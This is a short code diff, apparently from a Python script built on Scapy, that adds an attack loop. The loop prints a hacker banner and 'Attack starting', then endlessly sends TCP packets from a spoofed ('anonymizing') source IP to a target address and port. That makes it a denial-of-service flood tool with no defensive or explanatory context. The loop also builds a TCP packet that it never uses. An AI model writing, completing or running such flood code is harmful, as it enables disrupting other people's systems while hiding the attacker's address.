@@ -42,8 +42,13 @@ if type(awnser_anonymizing) == str and awnser_anonymizing != yourIP:
     Ip_range = awnser_anonymizing
     ipinfopacket = setpacketinfoip(Ip_range,destination)
     Ip_packet = setpacketinfoip(Ip_range,destination)
-    Tcp_packet = setpacketinfotcp(targetport)
     os.system('clear')
+    print 'HaCkEr5pReMe'
+    print ''
+    print 'Attack starting'
+    while 0 == 0:
+         Tcp_packet = setpacketinfotcp(targetport)
+         send(Ip_packet/TCP())
 
 
 
